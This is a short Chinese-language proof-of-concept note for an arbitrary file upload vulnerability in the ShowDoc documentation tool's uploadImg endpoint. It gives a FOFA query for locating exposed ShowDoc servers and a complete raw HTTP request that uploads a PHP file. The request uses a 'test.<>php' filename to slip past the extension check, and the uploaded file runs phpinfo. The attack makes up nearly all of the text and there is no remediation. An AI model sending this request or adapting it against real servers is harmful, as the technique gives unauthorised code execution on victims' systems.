## showDoc-uploadImg任意文件上传漏洞

showdoc是一个非常适合IT团队的在线API文档、技术文档工具，它可以提高团队成员之间的沟通效率， 使用此系统的用户众多，目前github star 10k+。showdoc使用php+sqlite，其历史版本接口 /index.php?s=/home/page/uploadImg 存在文件上传漏洞。

## fofa

```
app="ShowDoc"
```

## poc

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101
Firefox/88.0
Content-Length: 240
Content-Type: multipart/form-data; boundary=--------------------------7
Accept-Encoding: gzip
----------------------------7
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------7--
```

![image-20240531130717905](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405311307017.png)